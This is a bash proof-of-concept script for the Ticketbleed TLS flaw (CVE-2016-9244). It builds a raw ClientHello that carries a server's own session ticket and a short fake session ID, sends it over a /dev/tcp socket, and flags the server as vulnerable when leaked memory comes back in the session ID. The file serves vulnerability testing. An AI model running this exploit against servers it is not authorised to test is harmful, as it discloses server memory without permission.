#!/bin/bash

# POC bash socket implementation of ticketbleed (CVE-2016-9244), see also http://ticketbleed.com/
# Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt
#
# sockets inspired by http://blog.chris007.de/?p=238
# ticketbleed inspired by https://blog.filippo.io/finding-ticketbleed/
#
###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######

readonly PS4='${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
trap "cleanup" QUIT EXIT

[[ -z "$1" ]] && exit 1

# insert some hexspeak here :-)
SID="x00,x00,x0B,xAD,xC0,xDE,"               # don't forget the trailing comma

NODE="$1"
PORT="443"
TLSV=${2:-01}        # TLS 1.0=x01  1.1=0x02, 1.2=0x3
MAXSLEEP=10
SOCKREPLY=""
COL_WIDTH=32
DEBUG=${DEBUG:-"false"}
HELLO_READBYTES=${HELLO_READBYTES:-65535}

dec2hex() { printf "x%02x" "$1"; }
dec2hexB() {
     a=$(printf "%04x" "$1")
     printf "x%02s, x%02s" "${a:0:2}" "${a:2:2}"
}

LEN_SID=$(( ${#SID} / 4))                         # the real length in bytes
XLEN_SID="$(dec2hex $LEN_SID)"

red=$(tput setaf 1; tput bold)
green=$(tput bold; tput setaf 2)
lgreen=$(tput setaf 2)
brown=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
grey=$(tput setaf 7)
yellow=$(tput setaf 3; tput bold)
normal=$(tput sgr0)

send_clienthello() {
     local -i len_ch=222                          # len of clienthello, exlcuding TLS session ticket and SID (record layer), 416 -C2
     local session_tckt_tls="$1"
     local -i len_ckt_tls="${#1}"
     local xlen_ckt_tls=""

     len_ckt_tls=$(( len_ckt_tls / 4))
     xlen_ckt_tls="$(dec2hex $len_ckt_tls)"

     local len_handshake_record_layer="$(( SID_LEN + len_ch + len_ckt_tls ))"
     local xlen_handshake_record_layer="$(dec2hexB "$len_handshake_record_layer")"
     local len_handshake_ssl_layer="$(( len_handshake_record_layer + 4 ))"
     local xlen_handshake_ssl_layer="$(dec2hexB "$len_handshake_ssl_layer")"


     if $DEBUG; then
          echo "len_ckt_tls (hex):             $len_ckt_tls ($xlen_ckt_tls)"
          echo "SID:                           $SID"
          echo "LEN_SID (XLEN_SID)             $LEN_SID ($XLEN_SID)"
          echo "len_handshake_record_layer:    $len_handshake_record_layer ($xlen_handshake_record_layer)"
          echo "len_handshake_ssl_layer:       $len_handshake_ssl_layer ($xlen_handshake_ssl_layer)"
          echo "session_tckt_tls:              $session_tckt_tls"
     fi

     client_hello="
# TLS header (5 bytes)
     ,x16,               # Content type (x16 for handshake)
     x03, x03,           # TLS Version
                         # Length Secure Socket Layer follow:
     $xlen_handshake_ssl_layer,
# Handshake header
     x01,                # Type (x01 for ClientHello)
                         # Length of client hello follows:
     x00, $xlen_handshake_record_layer,
     x03, x$TLSV,        # TLS Version
# Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
     xee, xee, x5b, x90, x9d, x9b, x72, x0b,
     xbc, x0c, xbc, x2b, x92, xa8, x48, x97,
     xcf, xbd, x39, x04, xcc, x16, x0a, x85,
     x03, x90, x9f, x77, x04, x33, xff, xff,
     $XLEN_SID,          # Session ID length
     $SID
     x00, x66,             # Cipher suites length
# Cipher suites (51 suites)
     xc0, x14, xc0, x0a, xc0, x22, xc0, x21,
     x00, x39, x00, x38, x00, x88, x00, x87,
     xc0, x0f, xc0, x05, x00, x35, x00, x84,
     xc0, x12, xc0, x08, xc0, x1c, xc0, x1b,
     x00, x16, x00, x13, xc0, x0d, xc0, x03,
     x00, x0a, xc0, x13, xc0, x09, xc0, x1f,
     xc0, x1e, x00, x33, x00, x32, x00, x9a,
     x00, x99, x00, x45, x00, x44, xc0, x0e,
     xc0, x04, x00, x2f, x00, x96, x00, x41,
     xc0, x11, xc0, x07, xc0, x0c, xc0, x02,
     x00, x05, x00, x04, x00, x15, x00, x12,
     x00, x09, x00, x14, x00, x11, x00, x08,
     x00, x06, x00, x03, x00, xff,
     x01,               # Compression methods length
     x00,               # Compression method (x00 for NULL)
     x01, x0b,          # Extensions length
# Extension: ec_point_formats
     x00, x0b, x00, x04, x03, x00, x01, x02,
# Extension: elliptic_curves
     x00, x0a, x00, x34, x00, x32, x00, x0e,
     x00, x0d, x00, x19, x00, x0b, x00, x0c,
     x00, x18, x00, x09, x00, x0a, x00, x16,
     x00, x17, x00, x08, x00, x06, x00, x07,
     x00, x14, x00, x15, x00, x04, x00, x05,
     x00, x12, x00, x13, x00, x01, x00, x02,
     x00, x03, x00, x0f, x00, x10, x00, x11,
# Extension: SessionTicket TLS
     x00, x23,
# length of SessionTicket TLS
     x00, $xlen_ckt_tls,
# Session Ticket
     $session_tckt_tls                       # here we have the comma aleady
# Extension: Heartbeat
     x00, x0f, x00, x01, x01
     "
     msg=$(echo "$client_hello" | sed -e 's/# .*$//g' -e 's/ //g' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; /^$/d' | sed 's/,/\\/g' | tr -d '\n')
     socksend "$msg" $TLSV
}


parse_hn_port() {
     # strip "https", supposed it was supplied additionally
     grep -q 'https://' <<< "$NODE" && NODE="$(sed -e 's/https\:\/\///' <<< "$NODE")"

     # strip trailing urlpath
     NODE=$(sed -e 's/\/.*$//' <<< "$NODE")

     # determine port, supposed it was supplied additionally
     grep -q ':' <<< "$NODE" && PORT=$(sed 's/^.*\://' <<< "$NODE") && NODE=$(sed 's/\:.*$//' <<< "$NODE")
}

wait_kill(){
     pid=$1
     maxsleep=$2
     while true; do
          if ! ps $pid >/dev/null ; then
               return 0  # didn't reach maxsleep yet
          fi
          sleep 1
          maxsleep=$((maxsleep - 1))
          test $maxsleep -eq 0 && break
     done                # needs to be killed
     kill $pid >&2 2>/dev/null
     wait $pid 2>/dev/null
     return 3            # killed
}


socksend() {
     local len

     data="$(echo -n $1)"
     if "$DEBUG"; then
          echo "\"$data\""
          len=$(( $(wc -c <<< "$data") / 4 ))
          echo -n "length: $len / "
          dec2hexB $len
          echo
     fi
     echo -en "$data" >&5
}


sockread_nonblocking() {
     [[ "x$2" == "x" ]] && maxsleep=$MAXSLEEP || maxsleep=$2
     ret=0

     SOCKREPLY="$(dd bs=$1 count=1 <&5 2>/dev/null | hexdump -v -e '16/1 "%02X"')" &
     wait_kill $! $maxsleep
     ret=$?
     echo -n -e "$SOCKREPLY"       # this doesn't work as the SOCKREPLY above belngs to a bckgnd process
     return $ret
}

sockread() {
     dd bs=$1 count=1 <&5 2>/dev/null | hexdump -v -e '16/1 "%02X"'
}

fixme(){
     tput bold; tput setaf 5; echo -e "\n$1\n"; tput sgr0
}


fd_socket(){
     if ! exec 5<> /dev/tcp/$NODE/$PORT; then
          echo "$(basename $0): unable to connect to $NODE:$PORT"
          exit 2
     fi
}

close_socket(){
     exec 5<&-
     exec 5>&-
     return 0
}

cleanup() {
     close_socket
}


get_sessticket() {
     local sessticket_str

     sessticket_str="$(openssl s_client -connect $NODE:$PORT </dev/null 2>/dev/null | awk '/TLS session ticket:/,/^$/' | awk '!/TLS session ticket/')"
     sessticket_str="$(sed -e 's/^.* - /x/g' -e 's/  .*$//g' <<< "$sessticket_str" | tr '\n' ',')"
     sed -e 's/ /,x/g' -e 's/-/,x/g' <<< "$sessticket_str"
}

#### main

parse_hn_port "$1"

echo
"$DEBUG" && ( echo )
echo "##### 1) Connect to determine 1x session ticket TLS"
SESS_TICKET_TLS="$(get_sessticket)"
fd_socket $PORT

"$DEBUG" && ( echo; echo )
echo "##### 2) Sending ClientHello (TLS version 03,$TLSV) with this ticket and a made up SessionID"
"$DEBUG" && echo
send_clienthello "$SESS_TICKET_TLS"

"$DEBUG" && ( echo; echo )
echo "##### 3) Reading server reply ($HELLO_READBYTES bytes)"
echo
SOCKREPLY=$(sockread $HELLO_READBYTES)

if "$DEBUG"; then
     echo "###### ticketbleed reply: "
     echo "============================="
     echo "$SOCKREPLY" | head -20
     echo "============================="
fi

if [[ "${SOCKREPLY:0:2}" == "16" ]]; then
     echo -n "Handshake (TLS version: ${SOCKREPLY:2:4}), "
     if [[ "${SOCKREPLY:10:6}" == 020000 ]]; then
          echo -n "ServerHello -- "
     else
          echo -n "Message type: ${SOCKREPLY:10:6} -- "
     fi
     sid_detected="${SOCKREPLY:88:32}"
     sid_input=$(sed -e 's/x//g' -e 's/,//g' <<< "$SID")
     if "$DEBUG"; then
          echo
          echo "TLS version, record layer: ${SOCKREPLY:18:4}"
          echo "Random bytes / timestamp:  ${SOCKREPLY:22:64}"
          echo "Session ID:                $sid_detected"
     fi
     if grep -q $sid_input <<< "$sid_detected"; then
          echo "${red}VULNERABLE!${normal}"
          echo -n "  (${yellow}Session ID${normal}, ${red}mem returned${normal} --> "
          echo -n $sid_detected | sed -e "s/$sid_input/${yellow}$sid_input${normal}${red}/g"
          echo "${normal})"
     else
          echo -n "not expected server reply but likely not vulnerable"
     fi
elif [[ "${SOCKREPLY:0:2}" == "15" ]]; then
     echo -n "TLS Alert ${SOCKREPLY:10:4} (TLS version: ${SOCKREPLY:2:4}) -- "
     echo "${green}OK, not vulnerable${normal}"
else
     echo "TLS record "${SOCKREPLY:0:2}" replied"
     echo -n "Strange server reply, pls report"
fi
echo
echo


exit 0

#  vim:tw=200:ts=5:sw=5:expandtab
#  $Id: ticketbleed.bash,v 1.5 2017/04/16 18:28:41 dirkw Exp $
